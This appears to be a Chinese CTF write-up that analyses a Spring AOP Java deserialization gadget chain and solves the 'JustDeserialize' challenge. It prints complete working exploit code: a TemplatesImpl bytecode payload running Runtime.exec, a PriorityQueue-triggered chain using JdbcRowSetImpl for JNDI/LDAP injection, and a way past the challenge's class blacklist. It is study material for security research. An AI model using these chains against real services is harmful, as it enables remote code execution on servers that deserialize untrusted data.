# Spring-AOP链&amp;软件攻防赛半决赛Just-Deserialize

  
  
&lt;!--more--&gt;  
## 0x00 分析流程  
**调用链**  
```  
JdkDynamicAopProxy.invoke()-&gt;  
org.springframework.aop.framework.ReflectiveMethodInvocation#proceed-&gt;  
org.springframework.aop.aspectj.AspectJAroundAdvice#invoke-&gt;  
org.springframework.aop.aspectj.AbstractAspectJAdvice#invokeAdviceMethod(org.aspectj.lang.JoinPoint, org.aspectj.weaver.tools.JoinPointMatch, java.lang.Object, java.lang.Throwable)-&gt;  
org.springframework.aop.aspectj.AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs  
```  
`sink`点是`org.springframework.aop.aspectj.AbstractAspectJAdvice`类中的`invokeAdviceMethodWithGivenArgs`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504061324949.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504061325198.png)
其中`invokeAdviceMethodWithGivenArgs`可以反射任意方法，`readObject`又可以通过反射重新实例化`aspectJAdviceMethod`属性。  
所以我们反射三要素中的`Method`解决了，再来看`Object`，可以看到在上述代码中通过`this.aspectInstanceFactory.getAspectInstance()`来获取到的`Object`，其中`aspectInstanceFactory`是`AspectInstanceFactory`类，所以我们需要找一个实现了`AspectInstanceFactory`接口和`Serializable`接口的子类。来看一下实现了`getAspectInstance()`方法的类有哪些。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504061330857.png)
其中，符合我们条件的是`SingletonAspectInstanceFactory`类，并且其重写的`getAspectInstance()`也可以返回任意值，非常完美。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504061332075.png)
在`org.springframework.aop.framework.ReflectiveMethodInvocation#proceed`方法中会走到`org.springframework.aop.aspectj.AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs`方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504061342195.png)
`interceptorOrInterceptionAdvice`由`this.interceptorsAndDynamicMethodMatchers.get(&#43;&#43;this.currentInterceptorIndex)`进行赋值操作，而这两个一个是`list`，一个是`int`，都是我们可控的，因此`interceptorOrInterceptionAdvice`就是可控的。  
只需要将`interceptorOrInterceptionAdvice`赋值`org.springframework.aop.aspectj.AspectJAroundAdvice`类即可  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504061344158.png)
现在的问题是`ReflectiveMethodInvocation`是没有实现`Serializable`接口的，想要在反序列化中使用，那就只能动态创建。  
而在`JdkDynamicAopProxy`类中的`invoke`正好实例化了`ReflectiveMethodInvocation`类并且调用了`proceed`方法。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504061347510.png)
其`interceptorsAndDynamicMethodMatchers`是`JdkDynamicAopProxy#invoke`中的`chain`参数。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504061350022.png)
所以我们现在的思路就是  
- 通过反序列化触发`JdkDynamicAopProxy#invoke`方法，  
- 在`JdkDynamicAopProxy#invoke`方法中，控制chain的生成，需要让List放入目标对象`AspectJAroundAdvice`。  
- 通过`chain`创建出`ReflectiveMethodInvocation`对象，并调用`proceed`方法。  
- 接下来就是`ReflectiveMethodInvocation#proceed` -&gt; `AspectJAroundAdvice#invoke`-&gt;`AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs` 

现在来研究一下`chain`是如何生成的？  
`List&lt;Object&gt; chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass);`  
需要让其返回一个`List`，并且`List`里面要有一个元素，是我们的恶意对象。  
来看一下其方法的实现  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504061359053.png)
这里有两个办法获取  
- 从缓存`MethodCacheKey`中获取  
- 通过`getInterceptorsAndDynamicInterceptionAdvice`方法  

这里利用`getInterceptorsAndDynamicInterceptionAdvice`来控制，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504061403560.png)
通过`org.springframework.aop.framework.adapter.DefaultAdvisorAdapterRegistry#getInterceptors`来获取其返回值的。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504061405005.png)
`advice`变量是可控的，并且这个变量实现了`Advice`和`MethodInterceptor`接口，可以将其添加到`interceptors`，这个`interceptors`就是我们最终返回的目标`chain`  
现在就可以往`interceptors`中添加`AspectJAroundAdvice`实例，这个类拥有`MethodInterceptor`接口，但是没有`Advice`接口。但是我们仍然可以通过`JdkDynamicAopProxy`来同时代理`Advice`和`MethodInterceptor`接口，并设置反射调用对象`AspectJAroundAdvice`。  
至此整条链子就完整了  
## 0x01 POC构造  
```java  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import javassist.CannotCompileException;  
import javassist.ClassPool;  
import javassist.CtClass;  
import javassist.NotFoundException;  
import org.aopalliance.aop.Advice;  
import org.aopalliance.intercept.MethodInterceptor;  
import org.springframework.aop.aspectj.AbstractAspectJAdvice;  
import org.springframework.aop.aspectj.AspectJAroundAdvice;  
import org.springframework.aop.aspectj.AspectJExpressionPointcut;  
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;  
import org.springframework.aop.framework.AdvisedSupport;  
import org.springframework.aop.support.DefaultPointcutAdvisor;  
import javax.management.BadAttributeValueExpException;  
import java.io.*;  
import java.lang.reflect.*;  
import java.util.Base64;  
import java.util.UUID;  
  
public class Poc {  
    public static void main(String[] args) throws Exception {  
        byte[] code = getTemplates();  
        byte[][] codes = {code};  
        TemplatesImpl templates = TemplatesImpl.class.newInstance();  
        setFieldValue(templates, &#34;_bytecodes&#34;, codes);  
        setFieldValue(templates, &#34;_name&#34;, &#34;huahua&#34;);  
        setFieldValue(templates, &#34;_tfactory&#34;, null);  
  
        Method newTransformer = templates.getClass().getDeclaredMethod(&#34;newTransformer&#34;);  
        // args  
        SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(templates);  
        // Mehod 和 Object  
        AspectJAroundAdvice advice = new AspectJAroundAdvice(newTransformer, new AspectJExpressionPointcut(), factory);  
  
        Proxy proxy1 = (Proxy) getAProxy(advice, Advice.class);  
        BadAttributeValueExpException bad = new BadAttributeValueExpException(&#34;bad&#34;);  
        setFieldValue(bad, &#34;val&#34;, proxy1);  
        String payload = serialize(bad);  
        unserialize(payload);  
    }  
  
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception {  
        Field f = obj.getClass().getDeclaredField(field);  
        f.setAccessible(true);  
        f.set(obj, arg);  
    }  
  
    public static byte[] getTemplates() throws CannotCompileException, IOException, NotFoundException {  
        ClassPool classPool = ClassPool.getDefault();  
        // 生成一个随机的类名  
        String randomClassName = &#34;Test_&#34; &#43; UUID.randomUUID().toString().replace(&#34;-&#34;, &#34;&#34;);  
        CtClass ctClass = classPool.makeClass(randomClassName);  
        ctClass.setSuperclass(classPool.get(&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;));  
        String block = &#34;Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;);&#34;;  
        ctClass.makeClassInitializer().insertBefore(block);  
        return ctClass.toBytecode();  
    }  
  
    public static Object getBPorxy(Object obj, Class[] clazz) throws Exception {  
        AdvisedSupport advisedSupport = new AdvisedSupport();  
        advisedSupport.setTarget(obj);  
        Constructor&lt;?&gt; constructor = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;).getConstructor(AdvisedSupport.class);  
        constructor.setAccessible(true);  
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);  
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazz, handler);  
        return proxy;  
    }  
  
    public static Object getAProxy(Object obj, Class&lt;?&gt; clazz) throws Exception {  
        AdvisedSupport advisedSupport = new AdvisedSupport();  
        advisedSupport.setTarget(obj);  
        AbstractAspectJAdvice advice = (AbstractAspectJAdvice) obj;  
        DefaultPointcutAdvisor advisor = new DefaultPointcutAdvisor((Advice) getBPorxy(advice, new Class[]{MethodInterceptor.class, Advice.class}));  
        advisedSupport.addAdvisor(advisor);  
        Constructor constructor = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;).getConstructor(AdvisedSupport.class);  
        constructor.setAccessible(true);  
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);  
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler);  
        return proxy;  
    }  
  
    public static String serialize(Object object) throws IOException {  
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);  
        objectOutputStream.writeObject(object);  
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());  
    }  
  
    public static void unserialize(String base) throws Exception {  
        byte[] result = Base64.getDecoder().decode(base);  
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(result);  
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);  
        objectInputStream.readObject();  
    }  
}  
```  
  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504061444276.png)  
##  0x02 赛题分析[JustDeserialize]  
### 解法一  
漏洞点，  
```java  
@RequestMapping({&#34;/read&#34;})    
public String read(@RequestBody String body) {    
    if (body != null) {    
        try {    
            byte[] data = Base64.getDecoder().decode(body);    
            String temp = new String(data);    
            if (!temp.contains(&#34;naming&#34;) &amp;&amp; !temp.contains(&#34;com.sun&#34;) &amp;&amp; !temp.contains(&#34;jdk.jfr&#34;)) {    
                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(data);    
                MyObjectInputStream objectInputStream = new MyObjectInputStream(byteArrayInputStream);    
                Object object = objectInputStream.readObject();    
                return object.getClass().toString();    
            } else {    
                return &#34;banned&#34;;    
            }    
        } catch (Exception e) {    
            return e.toString();    
        }    
    } else {    
        return &#34;ok&#34;;    
    }    
}  
```  
存在两个黑名单，  
```java  
if (!temp.contains(&#34;naming&#34;) &amp;&amp; !temp.contains(&#34;com.sun&#34;) &amp;&amp; !temp.contains(&#34;jdk.jfr&#34;)) {    
                ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(data);    
                MyObjectInputStream objectInputStream = new MyObjectInputStream(byteArrayInputStream);    
                Object object = objectInputStream.readObject();    
                return object.getClass().toString();    
            } else {    
                return &#34;banned&#34;;    
            }    
```  
`blacklist`  
```  
javax.management.BadAttributeValueExpException    
com.sun.org.apache.xpath.internal.objects.XString    
java.rmi.MarshalledObject    
java.rmi.activation.ActivationID    
javax.swing.event.EventListenerList    
java.rmi.server.RemoteObject    
javax.swing.AbstractAction    
javax.swing.text.DefaultFormatter    
java.beans.EventHandler    
java.net.Inet4Address    
java.net.Inet6Address    
java.net.InetAddress    
java.net.InetSocketAddress    
java.net.Socket    
java.net.URL    
java.net.URLStreamHandler    
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl    
java.rmi.registry.Registry    
java.rmi.RemoteObjectInvocationHandler    
java.rmi.server.ObjID    
java.lang.System    
javax.management.remote.JMXServiceUR    
javax.management.remote.rmi.RMIConnector    
java.rmi.server.RemoteObject    
java.rmi.server.RemoteRef    
javax.swing.UIDefaults$TextAndMnemonicHashMap    
java.rmi.server.UnicastRemoteObject    
java.util.Base64    
java.util.Comparator    
java.util.HashMap    
java.util.logging.FileHandler    
java.security.SignedObject    
javax.swing.UIDefaults  
```  
- 第一个可以用`UTF8-Over`绕过  
- 第二个需要用到没有出现在黑名单类进行绕过  

通过上面的学习，我们已经知道`Spring AOP`存在原生链，并且他没有出现在黑名单中，这里只需要随便找一个方法，进行触发就可以，这里用CB链中的一部分。利用`compare`方法去触发动态代理的`invoke`方法  
```java  
PriorityQueue PQ = new PriorityQueue(1);    
PQ.add(1);    
PQ.add(2);    
setFieldValue(PQ, &#34;comparator&#34;, proxy1);    
setFieldValue(PQ, &#34;queue&#34;, new Object[]{proxy1, proxy1});  
```  
拼接上去就可以，直接构造`Poc`，  
```java  
import com.sun.rowset.JdbcRowSetImpl;    
import org.aopalliance.aop.Advice;    
import org.aopalliance.intercept.MethodInterceptor;    
import org.springframework.aop.aspectj.AbstractAspectJAdvice;    
import org.springframework.aop.aspectj.AspectJAroundAdvice;    
import org.springframework.aop.aspectj.AspectJExpressionPointcut;    
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;    
import org.springframework.aop.framework.AdvisedSupport;    
import org.springframework.aop.support.DefaultIntroductionAdvisor;    
import java.io.*;    
import java.lang.reflect.*;    
import java.util.Base64;    
import java.util.Comparator;    
import java.util.PriorityQueue;    
    
public class Test {    
    public static void main(String[] args) throws Exception {    
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();    
        jdbcRowSet.setDataSourceName(&#34;ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator&#34;);    
        Method method = jdbcRowSet.getClass().getMethod(&#34;getDatabaseMetaData&#34;);     
        SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(jdbcRowSet);    
        AspectJAroundAdvice advice = new AspectJAroundAdvice(method, new AspectJExpressionPointcut(), factory);    
        Proxy proxy1 = (Proxy) getAProxy(advice, new Class[]{Advice.class, Comparator.class});    
        PriorityQueue PQ = new PriorityQueue(1);    
        PQ.add(1);    
        PQ.add(2);    
        setFieldValue(PQ, &#34;comparator&#34;, proxy1);    
        setFieldValue(PQ, &#34;queue&#34;, new Object[]{proxy1, proxy1});    
        System.out.println(serialize(PQ));    
        unserialize(serialize(PQ));    
    
    }    
    
    public static Object getBProxy(Object obj, Class[] clazzs) throws Exception {    
        AdvisedSupport advisedSupport = new AdvisedSupport();    
        advisedSupport.setTarget(obj);    
        Constructor constructor = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;).getConstructor(AdvisedSupport.class);    
        constructor.setAccessible(true);    
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);    
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler);    
        return proxy;    
    }    
    
    public static Object getAProxy(Object obj, Class[] clazzs) throws Exception {    
        AdvisedSupport advisedSupport = new AdvisedSupport();    
        advisedSupport.setTarget(obj);    
        AbstractAspectJAdvice advice = (AbstractAspectJAdvice) obj;    
    
        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor((Advice) getBProxy(advice, new Class[]{MethodInterceptor.class, Advice.class}));    
        advisedSupport.addAdvisor(advisor);    
        Constructor constructor = Class.forName(&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;).getConstructor(AdvisedSupport.class);    
        constructor.setAccessible(true);    
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);    
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),clazzs, handler);    
        return proxy;    
    }    
    
    public static void unserialize(String base) throws IOException, Exception {    
        byte[] result = Base64.getDecoder().decode(base);    
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(result);    
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);    
        objectInputStream.readObject();    
    }    
    
    public static String serialize(Object object) throws IOException {    
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);    
        objectOutputStream.writeObject(object);    
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    
    }    
    
    public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {    
        Field f = object.getClass().getDeclaredField(field);    
        f.setAccessible(true);    
        f.set(object, arg);    
    }    
    
}  
```  
这里需要注意一下，需要把动态代理加上`Comparator`接口。  
```java  
Proxy proxy1 = (Proxy) getAProxy(advice, new Class[]{Advice.class, Comparator.class});    
PriorityQueue PQ = new PriorityQueue(1);    
PQ.add(1);    
PQ.add(2);    
setFieldValue(PQ, &#34;comparator&#34;, proxy1);    
setFieldValue(PQ, &#34;queue&#34;, new Object[]{proxy1, proxy1});  
```  
这里直接用的`JdbcRowSetImpl`打`JNDi`注入二次反序列化。  
### 解法二  
`lib`中存在`hsqldb`和`druid`依赖，也可以打`JNDI_Reference`触发`DruidDataSourceFactory`来打`hsql-jdbc`，触发hsql里的SerializationUtils二次反序列化实现RCE。  
利用`Java-Chains`来实现  
https://github.com/vulhub/java-chains/  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504061551535.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202504061550205.png)
  
## 0x03 Reference  
https://github.com/Ape1ron/SpringAopInDeserializationDemo1  
https://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ  

---

> Author: N1Rvana  
> URL: http://localhost:1313/spring-aop%E9%93%BE%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9Bjust-deserialize/  

